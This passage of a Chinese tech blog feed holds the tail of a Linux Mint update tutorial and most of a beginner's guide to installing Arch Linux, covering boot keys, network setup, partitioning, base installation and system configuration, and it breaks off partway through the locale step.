<p>当我们设置好 apt 软件源后，我们要做的就是进行必要的软件包更新..</p>
<p>还是两种方法</p>
<p><strong>注意：还是二选一</strong></p>
<h3 id="一终端法-1">一、终端法</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo apt upgrade
</span></span></code></pre></td></tr></table>
</div>
</div><p></p>
<p></p>
<p></p>
<p>搞定</p>
<p>接下来重启虚拟机就可以了</p>
<h3 id="二使用这个更新管理器">二、使用这个更新管理器</h3>
<p></p>
<p>点击就好～</p>
<p></p>
<p>然后输入密码就可以了</p>
<p></p>
<p>点击安装更新就好了
</p>
<p>确定</p>
<p></p>
<p>截图累死了&hellip;</p>
<p>然后等它跑完就好了</p>
<p></p>
<p>接下来重启虚拟机就可以了</p>
<h2 id="结语">结语</h2>
<p>首先要说的是，我是使用 Linux Mint 20 来演示的，在未来它会更新，也许本文章的有些细节与实情不相同，但操作是大同小异的。请根据实际情况随机应变。</p>
<p>其次，<del>不许笑</del> ，本文章是面向刚接触 Linux 的初学者，不喜勿喷。</p>
<p>如果有什么不足之处，或一些粗心造成的小错误，请在下面的 gitalk 中留言</p>
<p>最后，本站遵循 <a href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener noreffer">CC-BY-NC 4.0 协议</a>，转载请注明出处</p>
<hr>
<h2 id="参考链接">参考链接</h2>
<ul>
<li>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/linuxmint/" target="_blank" rel="noopener noreffer">linuxmint | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
</li>
<li>
<p><a href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/" target="_blank" rel="noopener noreffer">ubuntu | 镜像站使用帮助 | 清华大学开源软件镜像站 | Tsinghua Open Source Mirror</a></p>
</li>
</ul>
]]></description>
</item><item>
    <title>怎样安装 Arch Linux</title>
    <link>http://weepingdogel.github.io/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/</link>
    <pubDate>Sat, 13 Jun 2020 12:53:25 &#43;0800</pubDate>
    <author>作者</author>
    <guid>http://weepingdogel.github.io/posts/%E6%80%8E%E6%A0%B7%E5%AE%89%E8%A3%85arch_linux/</guid>
    <description><![CDATA[<div class="featured-image">
                <img src="/images/wallhaven-nky7y7.png" referrerpolicy="no-referrer">
            </div><h2 id="arch-linux是什么">Arch Linux是什么？</h2>
<p><strong><a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Linux</a></strong> 是一个通用 x86_64_ GNU/Linux 发行版，它采用滚动升级模式，尽权力给用户提供最新版本的稳定软件，因其&quot;简洁、现代、实用、以用户为中心&quot;的原则而得名。</p>
<p>Arch Wiki 上已经写明其原则</p>
<blockquote>
<p>简洁</p>
<p>Arch Linux 将简洁定义为：避免任何不必要的添加、修改和复杂增加。它提供的软件都来自原始开发者(上游)，仅进行和发行版(下游)相关的最小修改。</p>
<p>不包含上游不愿意接受的补丁。绝大部分 Arch 下游补丁都已经被上游接受，下一个正式版本里会包含。</p>
<p>配置文件也是来自上游，仅包含发行版必须的调整，比如特殊的文件系统路径变动。Arch 不会在安装一个软件包后就自动启动服务。</p>
<p>软件包通常都和一个上游项目直接对应。仅在极少数情况下才会拆分软件包。</p>
<p>官方不支持图形化配置界面，建议用户使用命令行或文本编辑器修改设置。</p>
</blockquote>
<blockquote>
<p>现代</p>
<p>Arch尽全力保持软件处于最新的稳定版本，只要不出现系统软件包破损，都尽量用最新版本。Arch采用滚动升级策略，安装之后可以持续升级。</p>
<p>Arch向GNU/Linux用户提供了许多新特性，包括systemd初始化系统、现代的文件系统、LVM2/EVMS、软件磁盘阵列（软RAID）、udev支持、initcpio（附带mkinitcpio）以及最新的内核。</p>
</blockquote>
<blockquote>
<p>实用</p>
<p>Arch 注重实用性，避免意识形态之争。最终的设计决策都是由开发者的共识决定。开发者依赖基于事实的技术分析和讨论，避免政治因素，不会被流行观点左右。</p>
<p>Arch Linux 的仓库中包含大量的软件包和编译脚本。用户可以按照需要进行自由选择。仓库中既提供了开源、自由的软件，也提供了闭源软件。实用性大于意识形态.</p>
</blockquote>
<blockquote>
<p>以用户为中心</p>
<p>许多 Linux 发行版都试图变得更“用户友好”，Arch Linux 则一直是，永远会是“以用户为中心”。此发行版是为了满足贡献者的需求，而不是为了吸引尽可能多的用户。Arch 适用于乐于自己动手的用户，他们愿意花时间阅读文档，解决自己的问题。</p>
<p>Arch 鼓励每一个用户 参与 和贡献，报告和帮助修复 bugs，提供软件包补丁和参加核心 项目：Arch 开发者都是志愿者，通过持续的贡献成为团队的一员。Archers 可以自行贡献软件包到 Arch 用户仓库, 提升 ArchWiki 文档质量, 在 论坛, 邮件列表, IRC 中给其它用户提供技术支持. Arch Linux 是全球很多用户的选择，已经有很多国际社区提供帮助和文档翻译。</p>
</blockquote>
<p>以上内容引用自 Arch Wiki 词条: <a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29#%E5%8E%9F%E5%88%99" target="_blank" rel="noopener noreffer">https://wiki.archlinux.org/index.php/Arch_Linux_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E5%8E%9F%E5%88%99</a></p>
<p>更多关于 Arch Linux 的介绍可以<a href="https://wiki.archlinux.org/index.php/Arch_Linux_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">参考这里</a></p>
<h2 id="如何安装">如何安装</h2>
<p>现在我们要知道的是如何安装它。</p>
<p>其实在Arch Wiki上已经有了安装指南，但是对于 Linux 新手或从未使用过 Linux 的入坑者来说似乎不太容易读懂。因此，这里将会简单的写出安装方法以及过程。</p>
<h3 id="安装条件">安装条件</h3>
<p>总的来说，Arch 对配置的要求并不是太高，因为它默认安装完不带任何软件（甚至是 vim、wget、git）。但是，由于用户需要安装和使用的软件不同，因此配置需求也会根据实际情况而变化。</p>
<p>这里根据个人经验例举几个，仅供参考</p>
<blockquote>
<p>不使用图形界面</p>
<ul>
<li>处理器需求: 1.0Ghz 单核或更好的</li>
<li>内存需求: 1GB 足够</li>
<li>显卡需求: 能亮就行</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: lxde</p>
<ul>
<li>处理器需求: 2.0Ghz 单核或更好的</li>
<li>内存: 2GB 或者更多</li>
<li>显卡需求: 能亮就行&hellip;.</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: xfce</p>
<ul>
<li>处理器需求: 2.0GHz 单核 ~ 3.0 Ghz 单核 或更好的</li>
<li>内存: 至少 2GB ，4GB 很够用</li>
<li>显卡需求: 能亮还得有 128MB 显存</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: Gnome</p>
<ul>
<li>处理器需求: 双核 2.0GHz以上</li>
<li>内存: 4GB 足够，但推荐更多</li>
<li>显卡需求: 一般的Intel核显如果有256MB显存就很流畅了</li>
<li>(一位不愿意透露姓名的 Gnome 用户表示不要推荐 Gnome)</li>
</ul>
</blockquote>
<blockquote>
<p>图形界面: KDE</p>
<ul>
<li>处理器需求: 尽量要有 3.0GHz 双核，至少 2.6GHz 双核</li>
<li>内存: 4GB 足够，但推荐更多</li>
<li>显卡需求: 尽量比上面 Gnome 的更好一些</li>
</ul>
</blockquote>
<p>Emmmm&hellip; 总的来说&hellip; 只要是个电脑，都能运行起来，只不过用 KDE 和 Gnome 会比较卡而已.. 只要不是上世纪的486电脑.. xfce应该都是带得动的。</p>
<h3 id="准备工作">准备工作</h3>
<p>这里会说明一下安装前需要准备什么</p>
<h4 id="安装介质">安装介质</h4>
<p>如果你曾经安装过其他 Linux 发行版，则不需要花太多时间看这一段，因为Arch Linux的安装介质的制作与其他发行版也是相差不大的。</p>
<p>如果你曾经重装过 Windows 操作系统，但没试过安装Linux ，也许你只需要稍微看一下，就会明白怎么做了</p>
<ul>
<li>
<p>第一步、下载Arch Linux的ISO镜像文件</p>
<ul>
<li>你可以去 <a href="https://www.archlinux.org/download/" target="_blank" rel="noopener noreffer">Arch 官网</a>下载，也可以去你所在位置的开源镜像站下载，这里贴出
<ul>
<li><a href="https://mirrors.tuna.tsinghua.edu.cn/archlinux/iso/latest//" target="_blank" rel="noopener noreffer">清华源传送门</a></li>
<li><a href="http://mirrors.ustc.edu.cn/archlinux/iso/" target="_blank" rel="noopener noreffer">中科大源传送门</a></li>
</ul>
</li>
</ul>
</li>
<li>
<p>第二步、准备一个U盘</p>
<ul>
<li>你需要准备一个U盘来刻录 ArchISO，最好是 8GB 以上</li>
</ul>
</li>
<li>
<p>第三步、使用刻录软件将 ArchISO 刻录进U盘</p>
<ul>
<li>Windows 环境: 这里推荐 <a href="https://rufus.ie/zh_CN.html" target="_blank" rel="noopener noreffer">rufus</a></li>
<li>Linux 环境: 可以使用 DD 命令 （如果电脑不支持EFI启动，不推荐。）</li>
</ul>
</li>
</ul>
<p>篇幅原因，这个就不写太多吧</p>
<h4 id="不爆炸的心态">不爆炸的心态</h4>
<p>如果你从未接触过 Arch Linux 或者是 Linux 新手，在安装过程中难免会遇到问题，这个时候不要慌张也不要着急，平静下来通过各种途径找出解决方法，不过这都需要有个不爆炸的心态。</p>
<h4 id="阅读-arch-wiki">阅读 Arch Wiki</h4>
<p>Arch 官方搭建了一个 Wiki 供用户查阅资料，当遇到安装过程中遇到麻烦的时候，也许 <a href="https://wiki.archlinux.org/index.php/Main_page_%28%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87%29" target="_blank" rel="noopener noreffer">Arch Wiki</a> 能够帮到你。</p>
<h2 id="一切准备就绪出发">一切准备就绪，出发</h2>
<p>当你准备好一切的时候，就可以开始安装了。</p>
<h3 id="启动-arch-iso">启动 Arch ISO</h3>
<p>首先插入你的 U 盘，然后在开机时按特定的按键以启动 U 盘中的ArchISO</p>
<p>这里放出不同品牌设备或主板的按键</p>
<blockquote>
<p>品牌台式</p>
<ul>
<li>联想台式电脑 F12</li>
<li>惠普台式电脑 F12</li>
<li>宏基台式电脑 F12</li>
<li>戴尔台式电脑 ESC</li>
<li>神舟台式电脑 F12</li>
<li>华硕台式电脑 F8</li>
<li>方正台式电脑 F12</li>
<li>清华同方台式电脑 F12</li>
<li>海尔台式电脑 F12</li>
<li>明基台式电脑 F8</li>
</ul>
</blockquote>
<blockquote>
<p>品牌笔记本</p>
<ul>
<li>联想笔记本 F12</li>
<li>宏基笔记本 F12</li>
<li>外星人笔记本 F12</li>
<li>小米笔记本 F12</li>
<li>华硕笔记本 ESC</li>
<li>惠普笔记本 F9</li>
<li>联想 Thinkpad F12</li>
<li>戴尔笔记本 F12</li>
<li>神舟笔记本 F12</li>
<li>东芝笔记本 F12</li>
<li>三星笔记本 F12</li>
<li>IBM笔记本 F12</li>
<li>富士通笔记本 F12</li>
<li>海尔笔记本 F12</li>
<li>方正笔记本 F12</li>
<li>清华同方笔记本 F12</li>
<li>微星笔记本 F11</li>
<li>明基笔记本 F9</li>
<li>技嘉笔记本 F12</li>
<li>Gateway笔记本 F12</li>
<li>eMachines笔记本 F12</li>
<li>索尼笔记本 ESC</li>
<li>苹果笔记本 开机长按 option 键</li>
</ul>
</blockquote>
<blockquote>
<p>主板</p>
<ul>
<li>华硕主板 F8</li>
<li>技嘉主板 F12</li>
<li>微星主板 F11</li>
<li>映泰主板 F9</li>
<li>梅捷主板 ESC 或 F12</li>
<li>七彩虹主板 ESC 或 F11</li>
<li>华擎主板 F11</li>
<li>斯巴达卡主板 ESC</li>
<li>昂达主板 F11</li>
<li>双敏主板 ESC</li>
<li>翔升主板 F10</li>
<li>精英主板 ESC 或 F11</li>
<li>冠盟主板 F11 或 F12</li>
<li>富士康主板 ESC 或 F12</li>
<li>顶星主板 F11 或 F12</li>
<li>铭瑄主板 ESC</li>
<li>盈通主板 F8</li>
<li>捷波主板 ESC</li>
<li>Intel 主板 F12</li>
<li>杰微主板 ESC 或 F8</li>
<li>致铭主板 F12</li>
<li>磐英主板 ESC</li>
<li>磐正主板 ESC</li>
<li>冠铭主板 F9</li>
</ul>
</blockquote>
<p>按下对应的按键，选择你的 U 盘，即可启动 Arch ISO。</p>
<p></p>
<p>如上图，Arch ISO 启动后将会出现这样的界面，直接选择第一项回车即可。</p>
<h3 id="确认是否连接到网络">确认是否连接到网络</h3>
<p>启动Arch ISO之后，你将操作一个运行在 tty 上的 Live CD，这个时候第一件事就是检查有没有连接到网络。</p>
<p>你可以使用 <code>ping</code> 这个命令来确认是否连接到网络，随便一个非局域网地址都可以</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ping weepingdogel.github.io
</span></span></code></pre></td></tr></table>
</div>
</div><p>若返回出类似这样的信息，则说明网络连接是正常的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">PING weepingdogel.github.io (185.199.111.153) 56(84) bytes of data.
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=2 ttl=48 time=113 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=3 ttl=48 time=110 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=4 ttl=48 time=114 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=5 ttl=49 time=113 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=6 ttl=48 time=111 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=7 ttl=48 time=112 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=8 ttl=49 time=113 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=9 ttl=49 time=111 ms
</span></span><span class="line"><span class="cl">64 bytes from 185.199.111.153 (185.199.111.153): icmp_seq=10 ttl=48 time=111 ms
</span></span><span class="line"><span class="cl">^C
</span></span><span class="line"><span class="cl">--- weepingdogel.github.io ping statistics ---
</span></span><span class="line"><span class="cl">11 packets transmitted, 9 received, 18.1818% packet loss, time 10801ms
</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev = 110.224/112.036/114.157/1.355 ms
</span></span></code></pre></td></tr></table>
</div>
</div><p>如果返回的不是类似于上面的信息，那么你可能没有正确连接到网络，你需要这样做</p>
<p>检查网卡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ip link
</span></span></code></pre></td></tr></table>
</div>
</div><p>将会返回这些</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN mode DEFAULT group default qlen 1000
</span></span><span class="line"><span class="cl">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
</span></span><span class="line"><span class="cl">2: enp3s0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP mode DEFAULT group default qlen 1000
</span></span><span class="line"><span class="cl">    link/ether bc:5f:f4:aa:04:c9 brd ff:ff:ff:ff:ff:ff
</span></span></code></pre></td></tr></table>
</div>
</div><p><code>lo</code> 是指 localhost ，一般情况下，如果你只有一个网卡的话，类似于 <code>enp3s0</code> 的名称就是你的网卡了，但不同品牌的网卡显示的也不同，如 Intel 网卡可能显示为 <code>ens33</code> 之类的。下面用 <code>&lt;网卡名&gt;</code> 来指代吧</p>
<p>设置网卡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ip link set &lt;网卡名&gt; up
</span></span></code></pre></td></tr></table>
</div>
</div><p>使用 <code>dhcpcd</code> 命令来自动匹配 DHCP 地址</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># dhcpcd
</span></span></code></pre></td></tr></table>
</div>
</div><p>它会自动帮你获取到 DHCP 地址，然后你就能连接到网络了</p>
<h3 id="同步系统时间">同步系统时间</h3>
<p>你需要保证 Live CD 目前的时间是准确的</p>
<p>这里执行 <code>timedatectl</code> 命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># timedatectl set-ntp true
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="分区">分区</h3>
<p>这里一直都是比较关键的部分，分区..</p>
<p>首先，你需要查看你的硬盘是否被识别</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># fdisk -l
</span></span></code></pre></td></tr></table>
</div>
</div><p>这里引入一个 <strong>块设备的概念</strong></p>
<p></p>
<p>也就是说如果被识别到，就会以 <code>/dev/sda</code> 或者 <code>/dev/nvme0n1</code> 这样，来表示你的硬盘。</p>
<p><code>rom</code>，<code>loop</code>，或者<code>airoot</code> 这样的，可以忽略不管。</p>
<h4 id="建立分区">建立分区</h4>
<p>有两种分区方式，一种是对于 BIOS+MBR 启动的，另一种是 UEFI启动配GPT分区的。</p>
<p>这里列个表格吧</p>
<ul>
<li>BIOS 和 MBR</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">挂载点</th>
<th>分区</th>
<th style="text-align:left">分区类型</th>
<th style="text-align:left">建议大小</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/mnt</code></td>
<td><code>/dev/sdX1</code></td>
<td style="text-align:left">Linux</td>
<td style="text-align:left">剩余空间</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">[SWAP]</td>
<td><code>/dev/sdX2</code></td>
<td style="text-align:left">Linux swap (交换空间)</td>
<td style="text-align:left">大于 512 MB</td>
<td></td>
</tr>
</tbody>
</table>
<ul>
<li>UEFI with GPT</li>
</ul>
<table>
<thead>
<tr>
<th style="text-align:left">挂载点</th>
<th>分区</th>
<th style="text-align:left">分区类型</th>
<th style="text-align:left">建议大小</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>/mnt/boot/EFI</code></td>
<td><code>/dev/sdX1</code></td>
<td style="text-align:left">EFI 系统分区</td>
<td style="text-align:left">260-512 MB</td>
<td></td>
</tr>
<tr>
<td style="text-align:left"><code>/mnt</code></td>
<td><code>/dev/sdX2</code></td>
<td style="text-align:left">Linux</td>
<td style="text-align:left">剩余空间</td>
<td></td>
</tr>
<tr>
<td style="text-align:left">[SWAP]</td>
<td><code>/dev/sdX3</code></td>
<td style="text-align:left">Linux swap (交换空间)</td>
<td style="text-align:left">大于 512 MB</td>
<td></td>
</tr>
</tbody>
</table>
<p>Live CD 里面有几种分区工具 <code>fdisk</code>、<code>parted</code>、<code>cfdisk</code> 等，具体过程我就不写出来了，我推荐用cfdisk，操作简单。</p>
<blockquote>
<p>注意：nvme 协议的硬盘设备名可能不是表上这个，也许是 <code>nvme0p1</code> 之类的。</p>
</blockquote>
<h4 id="格式化">格式化</h4>
<p>当你的分区建好了，这些分区要进行格式化</p>
<p>BIOS + MBR:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkfs.ext4 /dev/sdX1
</span></span></code></pre></td></tr></table>
</div>
</div><p>UEFI with GPT:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkfs.ext4 /dev/sdX2
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkfs.vfat -F 32 /dev/sdX1
</span></span></code></pre></td></tr></table>
</div>
</div><p>不同的分区需要选择不同的文件系统，这个你需要去搜索引擎搜索了，篇幅有限，解释不了这么多。</p>
<p>对于交换分区(第一个表中的 <code>/dev/sdx2</code>、第二个表中的 <code>/dev/sdX3</code>)，需要使用 <code>mkswap</code> 将其初始化：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mkswap /dev/sdX2
</span></span></code></pre></td></tr></table>
</div>
</div><p>挂载 swap</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># swapon /dev/sdX2
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="挂载分区">挂载分区</h4>
<p>将根分区挂载到<code>/mnt</code>，参考命令:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># mount /dev/sdX1 /mnt
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="安装基本系统">安装基本系统</h3>
<p>这个时候我们就已经可以安装基本系统了，但仍需要按照下面的步骤做</p>
<h4 id="选择镜像">选择镜像</h4>
<p>Arch Linux是通过网络安装的，它会通过镜像源直接在所在的分区下载需要的安装文件，安装速度较快，这也是为什么要确认网络是否连接。</p>
<p>而现在要做的是选择离你所在地最近的镜像源</p>
<p>这个文件 <code>/etc/pacman.d/mirrorlist</code> 里面写好了所有的镜像源，定义了软件包会从哪一个镜像源下载。在 Live CD 中，所有的镜像都会被启用，文件中是按照同步情况和速度进行排序的。</p>
<p>这个是你需要做的是修改它的顺序，将离你最近的镜像地址修改到第一位，你可以使用 <code>nano</code> 进行修改</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># nano /etc/pacman.d/mirrorlist
</span></span></code></pre></td></tr></table>
</div>
</div><p>在 nano 中，<code>CTRL</code>+<code>W</code> 为搜索，你可以通过这个在文件中搜索你所在国家或地区的名称，再将其下面的镜像地址使用 <code>CTRL</code>+<code>K</code> 进行剪切，再将其用 <code>CTRL</code>+<code>U</code> 粘贴到第一行即可。</p>
<h4 id="安装必要软件包">安装必要软件包</h4>
<p>Linux是由软件包组成的操作系统，而如果要启动它，就必须具备必要的软件包。</p>
<p>这个时候我们使用 <code>pacstrap</code> 脚本，安装 <code>base</code> 软件包 和 Linux 内核还有硬件的固件，这样基本系统很快就构建完成了。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacstrap /mnt base linux linux-firmware
</span></span></code></pre></td></tr></table>
</div>
</div><p>我推荐这样</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># pacstrap /mnt base base-devel linux linux-firmware linux-headers
</span></span></code></pre></td></tr></table>
</div>
</div><p>这样能够尽可能的安装上更多的基本软件。</p>
<p>一顿文字输出过后，基本系统就安装完成了。</p>
<h3 id="配置系统">配置系统</h3>
<p>基本系统刚安装完是没有灵魂的，需要进行配置才能完美地使用</p>
<h4 id="fstab">Fstab</h4>
<p>首先肯定要生成一个fstab文件，否则系统连硬盘都不认识。
用 <code>genfstab</code> 来生成</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># genfstab -U /mnt &gt;&gt; /mnt/etc/fstab
</span></span></code></pre></td></tr></table>
</div>
</div><p>最好在执行完以上命令后查看一下生成的 <code>/mnt/etc/fstab</code> 文件是否正确。</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># cat /mnt/etc/fstab
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="chroot">Chroot</h4>
<p>Chroot 是 &ldquo;Change root&rdquo; 的缩写，意思是更改根目录，而我们需要将 Live CD 的根目录更改为你安装好的系统的目录，这样才能操作它</p>
<p>用 <code>arch-chroot</code> 这个命令就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># arch-chroot /mnt
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="时区">时区</h4>
<p>chroot 完以后，第一步要修改时区</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ln -sf /usr/share/zoneinfo/Region/City /etc/localtime
</span></span></code></pre></td></tr></table>
</div>
</div><p>例如</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来运行 <code>hwclock</code> 生成 <code>/etc/adjtime</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl"># hwclock --systohc
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="本地化">本地化</h4>
<blockquote>
<p>本地化的程序与库若要本地化文本，都依赖 Locale，后者明确规定地域、货币、时区日期的格式、字符排列方式和其他本地化标准等等。在下面两个文件设置：<code>locale.gen</code> 与 <code>locale.conf</code>。 —— Arch Wiki</p>
</blockquote>
<p>所以不用多解释了&hellip;</p>
<p>编辑这个文件 <code>/etc/locale.gen</code> ，移除需要语言前面的 <code>#</code></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
